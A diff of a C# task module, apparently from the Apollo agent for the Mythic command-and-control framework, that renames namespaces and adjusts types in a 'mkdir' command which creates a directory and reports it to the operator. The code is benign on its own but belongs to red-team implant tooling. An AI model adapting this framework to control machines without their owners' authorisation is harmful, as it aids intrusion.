@@ -6,9 +6,9 @@
 
 #if MKDIR
 
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System;
 using System.IO;
 using System.Runtime.Serialization;
@@ -32,7 +32,7 @@ namespace Tasks
         public override void Start()
         {
             MythicTaskResponse resp;
-            MkdirParameters parameters = _dataSerializer.Deserialize<MkdirParameters>(_data.Parameters);
+            MkdirParameters parameters = _jsonSerializer.Deserialize<MkdirParameters>(_data.Parameters);
             
             if (System.IO.Directory.Exists(parameters.Path))
             {
@@ -47,7 +47,7 @@ namespace Tasks
                 {
                     DirectoryInfo info = Directory.CreateDirectory(parameters.Path);
                     FileInformation finfo = new FileInformation(info);
-                    ICommandMessage[] artifacts = new ICommandMessage[2]
+                    IMythicMessage[] artifacts = new IMythicMessage[2]
                     {
                         Artifact.FileCreate(info.FullName),
                         new FileBrowser(finfo),
@@ -67,9 +67,9 @@ namespace Tasks
                 }
             }
 
-            
-            
-            
+            // Your code here..
+            // CreateTaskResponse to create a new TaskResposne object
+            // Then add response to queue
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
